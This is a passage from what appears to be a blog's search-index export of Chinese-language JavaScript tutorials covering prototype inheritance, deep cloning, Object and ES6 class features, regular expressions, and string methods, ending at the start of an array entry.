判断构造函数的原型对象是否存在于实例对象的原型链中：实例对象 instanceof 构造函数，返回一个布尔值。原型对象.isPrototypeOf(实例对象)，返回一个布尔值。 上面是最简单的继承方式了，但是有两个致命缺点： 所有Sub的实例对象都继承自统一Super的实例对象，我们想穿参数到Super怎么办？如果Super里有引用类型的值，比如上面例子中Sub的实例对象中的arr属性push一个值，岂不是牵一发动全身？ 下面说一种最常用的组合继承模式，先举个例子12345678910111213141516171819function Super(value) &#123; // 只在此处声明基本属性和引用属性 this.val = value; this.arr = [1];&#125;// 在此处声明函数Super.prototype.fun1 = function () &#123;&#125;;Super.prototype.fun2 = function () &#123;&#125;;//Super.prototype.fun3...function Sub(value) &#123; Super.call(this, value); // 核心 // ...&#125;Sub.prototype = new Super(); // 核心 过程是这样的，在简单的原型链继承的基础上， Sub 的构造函数里运行 Super ，从而给 Sub 的每一个实例对象一份单独的属性，解决了上面两个问题，可以给 Super 传参数了，而且因为是独立的属性，不会因为误操作引用类型值而影响其他实例了。不过还有个小缺点: Sub 中调用的 Super 给每个 Sub 的实例对象一套新的属性，覆盖了继承的 Super 实例对象的属性，那被覆盖的的那套属性不就浪费了？岂不是白继承了？最严重的问题是 Super 被执行了两次，这不能忍(其实也没多大问题)。下面进行一下优化，把上面例子最后一行替换为: 123Sub.prototype = Object.create(Super.prototype);// Object.create() 给原型链上添加一环，否则 Sub 和 Super 的原型就重叠了。Sub.prototype.constructor = Sub; 到此为止，继承非常完美。其他还有各路继承方式无非是在 简单原型链继承 –&gt; 优化的组合继承 路程之间的一些思路或者封装。 通过 class 继承的方式:通过 class 实现继承的过程与 ES5完全相反，详细见下面 ES6 class的继承 部分。 对象的深度克隆JavaScript的基础类型是值传递，而对象是引用传递，这导致一个问题:克隆一个基础类型的变量的时候，克隆出来的的变量是和旧的变量完全独立的，只是值相同而已。而克隆对象的时候就要分两种情况了，简单的赋值会让两个变量指向同一块内存，两者代表同一个对象，甚至算不上克隆克隆。但我们常常需要的是两个属性和方法完全相同但却完全独立的对象，称为深度克隆。我们接下来讨论几种深度克隆的方法。说几句题外的话，业界有一个非常知名的库 immutable ，个人认为很大程度上解决了深度克隆的痛点，我们修改一个对象的时候，很多时候希望得到一个全新的对象(比如Redux每次都要用一个全新的对象修改状态)，由此我们就需要进行深度克隆。而 immutable 相当于产生了一种新的对象类型，每一次修改属性都会返回一个全新的 immutable 对象，免去了我们深度克隆的工作是小事，关键性能特别好。 历遍属性 123456789101112function clone(obj) &#123; let newobj = obj.constructor === Array ? [] : &#123;&#125;; // 用 instanceof 判断也可 if (typeof obj !== 'object' || obj === null) &#123; return obj; &#125; else &#123; for (let i in obj) &#123; newobj[i] = typeof obj[i] === 'object' ? clone(obj[i]) : obj[i]; // 只考虑 对象和数组， 函数虽然也是引用类型，但直接赋值并不会产生什么副作用，所以函数类型无需深度克隆。 &#125; &#125; return newobj;&#125; 原型式克隆 123456789101112function clone(obj) &#123; function F() &#123; &#125; F.prototype = obj; let f = new F(); for (let key in obj) &#123; if (typeof obj[key] === 'object') &#123; f[key] = clone(obj[key]); &#125; &#125; return f;&#125; 这种方式不能算严格意义上的深度克隆，并没有切断新对象与被克隆对象的联系，被克隆对象作为新对象的原型存在，虽然新对象的改变不会影响旧对象，但反之则不然！而且给新对象属性重新赋值的时候只是覆盖了原型中的属性，在历遍新对象的时候也会出现问题。这种方式问题重重，除了实现特殊目的可以酌情使用，通常情况应避免使用。 json序列化 1let newObj = JSON.parse(JSON.stringify(obj)); 这是我最喜欢的方式了！简短粗暴直接！但是最大的问题是，毕竟JSON只是一种数据格式所以这种方式只能克隆属性，不能克隆方法，方法在序列化以后就消失了。。。 一些Object的方法与需要注意的点Object 自身的方法: 设置属性，Object.defineProperty(obj, prop, descriptor) 根据 descriptor 定义 obj 的 prop 属性(值，是否可写可枚举可删除等)。Object.getOwnPropertyDescriptor(obj, prop) 返回 obj 的 prop 属性的描述。 使对象不可拓展，Object.preventExtensions(obj)，obj 将不能添加新的属性。判断对像是否可拓展，Object.isExtensible(obj)。 密封一个对象，Object.seal(obj)，obj 将不可拓展且不能删除已有属性。判断对象是否密封，Object.isSealed(obj)。 冻结对象，Object.freeze(obj) obj 将被密封且不可修改。判断对象是否冻结，Object.isFrozen(obj)。 获取对象自身属性(包括不可枚举的)，Object.getOwnPropertyNames(obj)，返回 obj 所有自身属性组成的数组。获取对象自身属性(不包括不可枚举的)，Object.keys(obj)，返回 obj 所有自身可枚举属性组成的数组。当使用for in循环遍历对象的属性时，原型链上的所有可枚举属性都将被访问。只关心对象本身时用Object.keys(obj)代替 for in，避免历遍原型链上的属性。 获取某对象的原型对象，Object.getPrototypeOf(object)，返回 object 的原型对象。设置某对象的原型对象，Object.setPrototypeOf(obj, prototype)，ES6 新方法，设置 obj 的原型对象为 prototype ，该语句比较耗时。 Object.prototype 上的方法: 查对象上某个属性是否存在时(存在于本身而不是原型链中)，obj.hasOwnProperty() 是唯一可用的方法，他不会向上查找原型链，只在 obj 自身查找，返回布尔值。 检测某对象是否存在于参数对象的原型链中，obj.isPrototypeOf(obj2)，obj 是否在 obj2 的原型链中，返回布尔值。 检测某属性是否是对象自身的可枚举属性，obj.propertyIsEnumerable(prop)，返回布尔值。 对象类型，obj.toString()，返回 &quot;[object type]&quot; type 可以是 Date，Array，Math 等对象类型。 obj.valueOf(),修改对象返回值时的行为，使用如下:123456789function myNumberType(n) &#123; this.number = n;&#125;myNumberType.prototype.valueOf = function () &#123; return this.number;&#125;;myObj = new myNumberType(4);myObj + 3; // 7 ES6新增特性 判断两个值是否完全相等，Object.is(value1, value2)，类似于 === 但是可以用来判断 NaN。 属性和方法简写: 123456789101112131415161718// 属性简写let foo = 'bar';let baz = &#123;foo&#125;;baz; // &#123;foo: "bar"&#125;// 等同于let baz = &#123;foo: foo&#125;;// 方法简写function f(x, y) &#123; return &#123;x, y&#125;;&#125;// 等同于function f(x, y) &#123; return &#123;x: x, y: y&#125;;&#125;f(1, 2); // Object &#123;x: 1, y: 2&#125; 合并对象Object.assign(target, [...source]);将 source 中所有和枚举的属性复制到 target。多个 source 对象有同名属性，后面的覆盖前面的。 12345let target = &#123;a: 1&#125;;let source1 = &#123;b: 2&#125;;let source2 = &#123;c: 3&#125;;Object.assign(target, source1, source2);target; // &#123;a:1, b:2, c:3&#125; 注意一点，该命令执行的是浅克隆，如果 source 中有属性是对象，target 中会复制该对象的引用。常用于给对象添加属性和方法(如给构造函数的原型添加方法)，克隆、合并对象等。 获取对象自身的值或键值对(做为Object.keys(obj)的补充不包括不可枚举的):Object.keys(obj)返回 obj 自身所有可枚举属性的值组成的数组。Object.entries(obj)返回 obj 自身所有可枚举键值对数组组成的数组，例如: 1234567var obj = &#123; foo: 'bar', baz: 42 &#125;;Object.entries(obj)// [ ["foo", "bar"], ["baz", 42] ]// 可用于将对象转为 Map 结构var obj = &#123; foo: 'bar', baz: 42 &#125;;var map = new Map(Object.entries(obj));map // Map &#123; foo: "bar", baz: 42 &#125; 拓展运算符...:取出对象所有可历遍属性，举例: 1234567let z = &#123;a: 3, b: 4&#125;;let n = &#123;...z&#125;;n; // &#123; a: 3, b: 4 &#125;// 可代替 Object.assign()let ab = &#123;...a, ...b&#125;;// 等同于let ab = Object.assign(&#123;&#125;, a, b); 可用于解构赋值中最后一个参数: 12345let &#123;x, y, ...z&#125; = &#123;x: 1, y: 2, a: 3, b: 4&#125;;x; // 1y; // 2z; // &#123; a: 3, b: 4 &#125;// 可以这样理解，把 z 拆开以后就等于后面对象未被分配出去的键值对。 Null 传导运算符: 123456const firstName = message?.body?.user?.firstName || 'default';// 代替const firstName = (message &amp;&amp; message.body &amp;&amp; message.body.user &amp;&amp; message.body.user.firstName) || 'default'; class:ES6 引入了 class 关键字，但并没有改变对象基于原型继承的原理，只是一个语法糖，让他长得像传统面向对象语言而已。以下两个写法完全等价: 12345678910111213141516171819202122function Point(x, y) &#123; this.x = x; this.y = y;&#125;Point.prototype.toString = function () &#123; return '(' + this.x + ', ' + this.y + ')';&#125;;//定义类class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return '(' + this.x + ', ' + this.y + ')'; &#125;&#125;// 类中定义的方法就是在原型上 有两点区别， class 中定义的方法是不可枚举的，class 必须通过 new 调用不能直接运行。class 不存在变量提升，使用要在定义之后。 class 中的方法前加 static 关键字定义静态方法，只能通过 class 直接调用不能被实例继承。如果静态方法包含 this 关键字，这个 this 指的是 class，而不是实例。注意下面代码: 123456789101112131415class Foo &#123; static bar() &#123; this.baz(); &#125; static baz() &#123; console.log('hello'); &#125; baz() &#123; console.log('world'); &#125;&#125;Foo.bar(); // hello 父类的静态方法，可以被子类继承，目前 class 内部无法定义静态属性。设置静态属性与实例属性新提案:class 的实例属性可以用等式，写入类的定义之中。静态属性直接前面加 static 即可。 1234class MyClass &#123; myProp = 42; static myStaticProp = 42;&#125; class 的继承:class 通过 extends 实现继承,注意 super 关键字 12345678910class ColorPoint extends Point &#123; constructor(x, y, color) &#123; super(x, y); // 调用父类的constructor(x, y) this.color = color; &#125; toString() &#123; return this.color + ' ' + super.toString(); // 调用父类的toString() &#125;&#125; extends 可以继承其他类或任何有 prototype 属性的函数。 super 会从父类获取各路信息绑定到子类的 this。 子类自己没有 this 对象，要先继承父类的实例对象然后再进行加工，所以要在 constructor 里调用 super 继承 this 对象后才能使用 this。 ES5 的继承，实质是先创造子类的实例对象 this，然后再将父类的方法添加到 this 上面（Parent.apply(this)）。ES6 的继承机制完全不同，实质是先创造父类的实例对象 this（所以必须先调用 super 方法创建和继承这个 this，并绑定到子类的 this），然后再用子类的构造函数修改this。 这条理由也是造成了 ES6 之前无法继承原生的构造函数(Array Function Date 等)的原型对象，而使用 class 可以。因为 ES5 中的方法是先实例化子类，再把父类的属性添加上去，但是父类有很多不能直接访问的属性或方法，这就糟了，而通过 class 继承反其道而行之先实例化父类，这就自然把所有属性和方法都继承了。 super 作为对象时，在普通方法中，指向父类的原型对象；在静态方法中，指向父类。 通过 super 调用父类的方法时，super 会绑定子类的 this。 constructor 方法会被默认添加: 123456789class ColorPoint extends Point &#123;&#125;// 等同于class ColorPoint extends Point &#123; constructor(...args) &#123; super(...args); &#125;&#125; Object.getPrototypeOf(object)，获取某对象的原型对象，也可以获取某类的原型类。 class 的 __proto__与prototype子类的__proto__属性，表示构造函数的继承，总是指向父类。子类prototype属性的__proto__属性，表示方法的继承，总是指向父类的 prototype 属性。相当于子类本身继承父类，子类的原型对象继承自父类的原型对象。 new.target:用在构造函数或者 class 内部，指向调用时 new 的构造函数或者 class。]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>对象</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA_正则表达式]]></title>
    <url>%2F2018%2F04%2F17%2FECMA_%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[元字符现在你已经知道几个很有用的元字符了，如\b,.,*，还有\d.正则表达式里还有更多的元字符，比如\s匹配任意的空白符，包括空格，制表符(Tab)，换行符，中文全角空格等。\w匹配字母或数字或下划线或汉字等。 \ba\w*\b匹配以字母a开头的单词——先是某个单词开始处(\b)，然后是字母a,然后是任意数量的字母或数字(\w*)，最后是单词结束处(\b)。 \d+匹配1个或更多连续的数字。这里的+是和*类似的元字符，不同的是*匹配重复任意次(可能是0次)，而+则匹配重复1次或更多次。 \b\w{6}\b 匹配刚好6个字符的单词。 表1、常用的元字符 代码 说明 . 匹配除换行符以外的任意字符 \w 匹配字母或数字或下划线或汉字 \s 匹配任意的空白符 \d 匹配数字 \b 匹配单词的开始或结束 ^ 匹配字符串的开始 $ 匹配字符串的结束 元字符^（和数字6在同一个键位上的符号）和$都匹配一个位置，这和\b有点类似。^匹配你要用来查找的字符串的开头，$匹配结尾。这两个代码在验证输入的内容时非常有用，比如一个网站如果要求你填写的QQ号必须为5位到12位数字时，可以使用：^\d{5,12}$。 这里的{5,12}和前面介绍过的{2}是类似的，只不过{2}匹配只能不多不少重复2次，{5,12}则是重复的次数不能少于5次，不能多于12次，否则都不匹配。 因为使用了^和$，所以输入的整个字符串都要用来和\d{5,12}来匹配，也就是说整个输入必须是5到12个数字，因此如果输入的QQ号能匹配这个正则表达式的话，那就符合要求了。 和忽略大小写的选项类似，有些正则表达式处理工具还有一个处理多行的选项。如果选中了这个选项，^和$的意义就变成了匹配行的开始处和结束处。 字符转义如果你想查找元字符本身的话，比如你查找.,或者*,就出现了问题：你没办法指定它们，因为它们会被解释成别的意思。这时你就得使用\来取消这些字符的特殊意义。因此，你应该使用\.和\*。当然，要查找\本身，你也得用\\. 例如：deerchao\.net匹配deerchao.net，C:\\Windows匹配C:\Windows。 重复你已经看过了前面的*,+,{2},{5,12}这几个匹配重复的方式了。下面是正则表达式中所有的限定符(指定数量的代码，例如*,{5,12}等)： 表2、常用的限定符 代码/语法 说明 * 重复零次或更多次 + 重复一次或更多次 ? 重复零次或一次 {n} 重复n次 {n,} 重复n次或更多次 {n,m} 重复n到m次 下面是一些使用重复的例子： Windows\d+匹配Windows后面跟1个或更多数字 ^\w+匹配一行的第一个单词(或整个字符串的第一个单词，具体匹配哪个意思得看选项设置) 字符类要想查找数字，字母或数字，空白是很简单的，因为已经有了对应这些字符集合的元字符，但是如果你想匹配没有预定义元字符的字符集合(比如元音字母a,e,i,o,u),应该怎么办？ 很简单，你只需要在方括号里列出它们就行了，像[aeiou]就匹配任何一个英文元音字母，[.?!]匹配标点符号(.或?或!)。 我们也可以轻松地指定一个字符范围，像[0-9]代表的含意与\d就是完全一致的：一位数字；同理[a-z0-9A-Z_]也完全等同于\w（如果只考虑英文的话）。 下面是一个更复杂的表达式：\(?0\d{2}[) -]?\d{8}。 “(”和“)”也是元字符，后面的分组节里会提到，所以在这里需要使用转义。这个表达式可以匹配几种格式的电话号码，像(010)88886666，或022-22334455，或02912345678等。我们对它进行一些分析吧：首先是一个转义字符\(,它能出现0次或1次(?),然后是一个0，后面跟着2个数字(\d{2})，然后是)或-或空格中的一个，它出现1次或不出现(?)，最后是8个数字(\d{8})。 分枝条件不幸的是，刚才那个表达式也能匹配010)12345678或(022-87654321这样的“不正确”的格式。要解决这个问题，我们需要用到分枝条件。正则表达式里的分枝条件指的是有几种规则，如果满足其中任意一种规则都应该当成匹配，具体方法是用|把不同的规则分隔开。听不明白？没关系，看例子： 0\d{2}-\d{8}|0\d{3}-\d{7}这个表达式能匹配两种以连字号分隔的电话号码：一种是三位区号，8位本地号(如010-12345678)，一种是4位区号，7位本地号(0376-2233445)。 \(0\d{2}\)[- ]?\d{8}|0\d{2}[- ]?\d{8}这个表达式匹配3位区号的电话号码，其中区号可以用小括号括起来，也可以不用，区号与本地号间可以用连字号或空格间隔，也可以没有间隔。你可以试试用分枝条件把这个表达式扩展成也支持4位区号的。 \d{5}-\d{4}|\d{5}这个表达式用于匹配美国的邮政编码。美国邮编的规则是5位数字，或者用连字号间隔的9位数字。之所以要给出这个例子是因为它能说明一个问题：使用分枝条件时，要注意各个条件的顺序。如果你把它改成\d{5}|\d{5}-\d{4}的话，那么就只会匹配5位的邮编(以及9位邮编的前5位)。原因是匹配分枝条件时，将会从左到右地测试每个条件，如果满足了某个分枝的话，就不会去再管其它的条件了。 分组我们已经提到了怎么重复单个字符（直接在字符后面加上限定符就行了）；但如果想要重复多个字符又该怎么办？你可以用小括号来指定子表达式(也叫做分组)，然后你就可以指定这个子表达式的重复次数了，你也可以对子表达式进行其它一些操作(后面会有介绍)。 (\d{1,3}\.){3}\d{1,3}是一个简单的IP地址匹配表达式。要理解这个表达式，请按下列顺序分析它：\d{1,3}匹配1到3位的数字，(\d{1,3}\.){3}匹配三位数字加上一个英文句号(这个整体也就是这个分组)重复3次，最后再加上一个一到三位的数字(\d{1,3})。 不幸的是，它也将匹配256.300.888.999这种不可能存在的IP地址。如果能使用算术比较的话，或许能简单地解决这个问题，但是正则表达式中并不提供关于数学的任何功能，所以只能使用冗长的分组，选择，字符类来描述一个正确的IP地址：((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)。 理解这个表达式的关键是理解2[0-4]\d|25[0-5]|[01]?\d\d?，这里我就不细说了，你自己应该能分析得出来它的意义。 反义有时需要查找不属于某个能简单定义的字符类的字符。比如想查找除了数字以外，其它任意字符都行的情况，这时需要用到反义： 表3、常用的反义代码 代码/语法 说明 \W 匹配任意不是字母，数字，下划线，汉字的字符 \S 匹配任意不是空白符的字符 \D 匹配任意非数字的字符 \B 匹配不是单词开头或结束的位置 [^x] 匹配除了x以外的任意字符 [^aeiou] 匹配除了aeiou这几个字母以外的任意字符 例子：\S+匹配不包含空白符的字符串。 &lt;a[^&gt;]+&gt;匹配用尖括号括起来的以a开头的字符串。 反向引用使用小括号指定一个子表达式后，匹配这个子表达式的文本(也就是此分组捕获的内容)可以在表达式或其它程序中作进一步的处理。默认情况下，每个分组会自动拥有一个组号，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，以此类推。 后向引用用于重复搜索前面某个分组匹配的文本。例如，\1代表分组1匹配的文本。难以理解？请看示例： \b(\w+)\b\s+\1\b可以用来匹配重复的单词，像go go, 或者kitty kitty。这个表达式首先是一个单词，也就是单词开始处和结束处之间的多于一个的字母或数字(\b(\w+)\b)，这个单词会被捕获到编号为1的分组中，然后是1个或几个空白符(\s+)，最后是分组1中捕获的内容（也就是前面匹配的那个单词）(\1)。 你也可以自己指定子表达式的组名。要指定一个子表达式的组名，请使用这样的语法：(?&lt;Word&gt;\w+)(或者把尖括号换成’也行：(?&#39;Word&#39;\w+)),这样就把\w+的组名指定为Word了。要反向引用这个分组捕获的内容，你可以使用\k&lt;Word&gt;,所以上一个例子也可以写成这样：\b(?&lt;Word&gt;\w+)\b\s+\k&lt;Word&gt;\b。 使用小括号的时候，还有很多特定用途的语法。下面列出了最常用的一些： 表4、常用的分组语法 分组 代码/语法 说明 捕获 (exp) 匹配exp (?&lt;name>exp) 匹配exp,并捕获文本到名称为name的组里，也可以写成(?’name’exp) (?:exp) 匹配exp,不捕获匹配的文本，也不给此分组分配组号 零宽断言 (?=exp) 匹配exp前面的位置 (?&lt;=exp) 匹配exp后面的位置 (?!exp) 匹配后面跟的不是exp的位置 (?&lt;!exp) 匹配前面不是exp的位置 注释 (?#comment) 这种类型的分组不对正则表达式的处理产生任何影响，用于提供注释让人阅读 我们已经讨论了前两种语法。第三个(?:exp)不会改变正则表达式的处理方式，只是这样的组匹配的内容不会像前两种那样被捕获到某个组里面，也不会拥有组号。“我为什么会想要这样做？”——好问题，你觉得为什么呢？ 零宽断言接下来的四个用于查找在某些内容(但并不包括这些内容)之前或之后的东西，也就是说它们像\b,^,$那样用于指定一个位置，这个位置应该满足一定的条件(即断言)，因此它们也被称为零宽断言。最好还是拿例子来说明吧： (?=exp)也叫零宽度正预测先行断言，它断言自身出现的位置的后面能匹配表达式exp。比如\b\w+(?=ing\b)，匹配以ing结尾的单词的前面部分(除了ing以外的部分)，如查找I&#39;m singing while you&#39;re dancing.时，它会匹配sing和danc。 (?&lt;=exp)也叫零宽度正回顾后发断言，它断言自身出现的位置的前面能匹配表达式exp。比如(?&lt;=\bre)\w+\b会匹配以re开头的单词的后半部分(除了re以外的部分)，例如在查找reading a book时，它匹配ading。 假如你想要给一个很长的数字中每三位间加一个逗号(当然是从右边加起了)，你可以这样查找需要在前面和里面添加逗号的部分：((?&lt;=\d)\d{3})+\b，用它对1234567890进行查找时结果是234567890。 下面这个例子同时使用了这两种断言：(?&lt;=\s)\d+(?=\s)匹配以空白符间隔的数字(再次强调，不包括这些空白符)。 负向零宽断言前面我们提到过怎么查找不是某个字符或不在某个字符类里的字符的方法(反义)。但是如果我们只是想要确保某个字符没有出现，但并不想去匹配它时怎么办？例如，如果我们想查找这样的单词–它里面出现了字母q,但是q后面跟的不是字母u,我们可以尝试这样： \b\w*q[^u]\w*\b匹配包含后面不是字母u的字母q的单词。但是如果多做测试(或者你思维足够敏锐，直接就观察出来了)，你会发现，如果q出现在单词的结尾的话，像Iraq,Benq，这个表达式就会出错。这是因为[^u]总要匹配一个字符，所以如果q是单词的最后一个字符的话，后面的[^u]将会匹配q后面的单词分隔符(可能是空格，或者是句号或其它的什么)，后面的\w\b将会匹配下一个单词，于是`\b\wq[^u]\w\b就能匹配整个Iraq fighting。负向零宽断言能解决这样的问题，因为它只匹配一个位置，并不消费任何字符。现在，我们可以这样来解决这个问题：\b\wq(?!u)\w*\b`。 零宽度负预测先行断言(?!exp)，断言此位置的后面不能匹配表达式exp。例如：\d{3}(?!\d)匹配三位数字，而且这三位数字的后面不能是数字；\b((?!abc)\w)+\b匹配不包含连续字符串abc的单词。 同理，我们可以用(?&lt;!exp),零宽度负回顾后发断言来断言此位置的前面不能匹配表达式exp：(?&lt;![a-z])\d{7}匹配前面不是小写字母的七位数字。 一个更复杂的例子：(?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;)匹配不包含属性的简单HTML标签内里的内容。(?&lt;=&lt;(\w+)&gt;)指定了这样的前缀：被尖括号括起来的单词(比如可能是)，然后是.*(任意的字符串),最后是一个后缀(?=&lt;\/\1&gt;)。注意后缀里的\/，它用到了前面提过的字符转义；\1则是一个反向引用，引用的正是捕获的第一组，前面的(\w+)匹配的内容，这样如果前缀实际上是&lt;b&gt;的话，后缀就是&lt;/b&gt;了。整个表达式匹配的是&lt;b&gt;和&lt;/b&gt;之间的内容(再次提醒，不包括前缀和后缀本身)。 请详细分析表达式(?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;)，这个表达式最能表现零宽断言的真正用途。 贪婪与懒惰当正则表达式中包含能接受重复的限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配尽可能多的字符。以这个表达式为例：a.*b，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索aabab的话，它会匹配整个字符串aabab。这被称为贪婪匹配。 有时，我们更需要懒惰匹配，也就是匹配尽可能少的字符。前面给出的限定符都可以被转化为懒惰匹配模式，只要在它后面加上一个问号?。这样.*?就意味着匹配任意数量的重复，但是在能使整个匹配成功的前提下使用最少的重复。现在看看懒惰版的例子吧： a.*?b匹配最短的，以a开始，以b结束的字符串。如果把它应用于aabab的话，它会匹配aab（第一到第三个字符）和ab（第四到第五个字符）。 表5、懒惰限定符 代码/语法 说明 *? 重复零次或更多次，但尽可能少重复 +? 重复一次或更多次，但尽可能少重复 ?? 重复零次或一次，但尽可能少重复 {n,}? 重复n次或更多次，但尽可能少重复 {n,m}? 重复n到m次，但尽可能少重复]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA-字符串]]></title>
    <url>%2F2018%2F04%2F17%2FECMA_%E5%AD%97%E7%AC%A6%E4%B8%B2%2F</url>
    <content type="text"><![CDATA[一、创建字符串字面量创建1var str = 'abc' 包装类型1var str = new String('abc') ES6模板字符串1var str = `abc` 使用 String.fromCharCode() / 【ES6】String.fromCodePoint() 将字符编码转成字符串二、字符串基本包装类型的方法字符方法：str.charAt() 描述：访问字符串中特定位置的字符 参数：一个数字，表示字符串的位置 返回值：返回该位置的字符 str.charCodeAt() 描述：功能用法与 charAt 相同，唯一不同的是，charCodeAt 返回的是字符编码而不是字符 返回值：字符编码 【ES6】str.codePointAt() 描述：弥补 charCodeAt 不能正确处理需要4个字节表示的字符的缺陷，codePointAt 能够正确处理4个字节储存的字符，返回一个字符的码点。可以使用codePointAt 来检测一个字符是由两个字节组成，还是由4个字节组成 参数：一个数字，字符在字符串中的位置 返回值：字符编码 字符串操作方法str.concat() 描述：连接多个字符串为一个字符串 参数：任意多个参数，要依次连接的字符串 返回值：新字符串 是否改变原字符串：否 str.slice()str.substr()str.substring()12345678910描述：上面三个方法都能基于已有字符串创建新字符串，但不会影响原字符串。参数：第一个参数：指定起始位置 如果传正数：三个函数行为相同 如果传负数：substring 会把负数转为0，相当于 substring(0) 第二个参数：可选 如果是正数：substr 指定的是返回字符串的数量，substring 和 slice 指定的是字符串的结束位置(返回字符串不包含该位置) 如果是负数：substr 和 substring 都会把负数变为0 substring 会自动调整 0 的位置比如 【substring(3, 0) ==&gt;转化为==&gt; substring(0, 3)】返回值：新字符串是否改变原字符串：否 str.trim() 描述：去掉字符串的前后空格 参数：无 返回值：新字符串 是否改变原字符串：否 str.toLowerCase()str.toUpperCase()str.toLocaleLowerCase()str.toLocaleUpperCase() 描述：字符串转大小写 参数：无 返回值：转变后的字符串 是否改变原字符串：否 【ES6】str.repeat() 描述：方法返回一个新字符串，表示将原字符串重复n次 参数： 一个大于 -1 的数字，表示重复的次数(传递小于 -1 的数字会报错，传递小数会取整，之所以可以传递 -1 ~ 0 之间的数字是因为，-1 ~ 0之间的数字取整后都为0，并不会报错) 返回值：新字符串 是否改变原字符串：否 【ES7】padStart()【ES7】padEnd()123描述：对字符串进行补全，padStart 前补全，padEnd 后补全参数：第一个参数：字符串的最小长度 第二个参数：可选，用来填充的字符串，默认用空格填充 字符串位置方法str.indexOf()str.lastIndexOf()12345描述：从一个字符串中搜索子字符串，并返回子字符串第一次出现的位置（不同的是：indexOf 从前往后找， lastIndexOf 从后往前找）参数：第一个参数：要查找的子字符串 第二个参数：查找的起始位置返回值：子字符串第一次出现的位置，未找到返回-1是否改变原字符串：否 【ES6】str.includes()【ES6】str.startsWith()【ES6】str.endsWith()1234567描述：上面三个函数都是查找字符串中是否包含子字符串 str.includes() ：字符串是否包含子字符串 str.startsWith() ：字符串是否以子字符串开头 str.endsWith() ：字符串是否以子字符串结尾参数：第一个参数：子字符串 第二个参数：查找的起始位置【注意：给endsWith指定第二个参数n是，它指的是前n个字符】返回值：满足条件返回 true，否则返回 false 模式匹配方法str.match() 描述：通过模式匹配字符串 参数：字符串 / 正则表达式 / RegExp 对象 返回值：数组，数组的第一项是与整个模式匹配的项，后面的每一项保存着与正则表达式中的捕获组匹配的字符串 str.search() 描述：和 indexOf 功能相似，唯一不同的是：该方法支持正则 参数：字符串 / 正则表达式 / RegExp 对象 返回值：返回第一个匹配项的索引，没有找到返回 -1 str.replace() 描述：通过模式替换匹配的字符串 参数： 123456789101112131415161718第一个参数：字符串 / 正则表达式第二个参数：字符串 / 函数 如果第二个参数是字符串：可以使用特殊的字符序列： $$ =====&gt; $ $&amp; =====&gt; 匹配整个模式的字符串，与RegExp.lastMatch的值相同 $&apos; =====&gt; 匹配的子字符串之后的子字符串，与RegExp.rightContext的值相同 $` =====&gt; 匹配的子字符串之前的子字符串，与RegExp.leftContext的值相同 $n =====&gt; 匹配第n(0 ~ 9)个捕获组的子字符串，如果正则表达式中没有捕获组，则使用空字符串 $nn =====&gt; 匹配第nn(01 ~ 99)个捕获组的子字符串，如果正则表达式中没有捕获组，则使用空字符串 如果第二个参数是函数：(该函数接收的参数与正则表达式有关) 1、正则表达式只有一个匹配项，即无捕获组 该函数接收三个参数：第一个：模式的匹配项 第二个：模式匹配项在字符串中的位置 第三个：原始字符串 2、正则表达式中定义了多个捕获组 该函数接收参数如下：第一个：模式的匹配项 第二个 ~ 第n个：第二个捕获组的匹配项 ~ 第n个捕获组的匹配项 最后两个参数分别是：模式匹配项在字符串中的位置 和 原始字符串 返回值：新字符串 是否改变原字符串：否 str.split() 描述：基于指定的字符或模式，将字符串分割成数组 参数： 第一个参数：字符串 / 正则表达式 第二个参数：指定数组的长度 字符串比较方法str1.localeCompare(str2) 描述：对两个字符串进行比较 参数：字符串 返回值： 123如果 str &gt; str2 ，返回 1如果 str = str2 ，返回 0如果 str &lt; str2 ，返回 -1 【ES6】str1.normalize() 描述：ES6提供字符串实例的normalize()方法，用来将字符的不同表示方法统一为同样的形式，这称为Unicode正规化。 参数：123456789&apos;NFC&apos; :默认参数，表示“标准等价合成”（Normalization Form Canonical Composition），返回多个简单字符的合成字符。所谓“标准等价”指的是视觉和语义上的等价。&apos;NFD&apos; :表示“标准等价分解”（Normalization Form Canonical Decomposition），即在标准等价的前提下，返回合成字符分解的多个简单字符。&apos;NFKC&apos; :表示“兼容等价合成”（Normalization Form Compatibility Composition），返回合成字符。所谓“兼容等价”指的是语义上存在等价，但视觉上不等价，比如“囍”和“喜喜”。（这只是用来举例，normalize方法不能识别中文。）&apos;NFKD&apos; :表示“兼容等价分解”（Normalization Form Compatibility Decomposition），即在兼容等价的前提下，返回合成字符分解的多个简单字符。 String构造函数的静态方法String.fromCharCode() 描述：接受一至多个字符编码，然后将他们转换成一个字符串 参数：1 ~ n 个字符编码 返回值：字符串 【ES6】String.fromCodePoint() 描述：接受一至多个字符编码，然后将他们转换成字符串，该方法弥补 String.fromCharCode() 方法不能识别字符编码大于0xFFFF的缺陷 字符串的其他扩展ES6为字符串添加了遍历器接口(Iterator)，这个遍历器最大的优点是可以识别大于0xFFFF的码点，传统的 for 循环无法识别这样的码点。]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA-数组]]></title>
    <url>%2F2018%2F04%2F17%2FECMA_%E6%95%B0%E7%BB%84%2F</url>
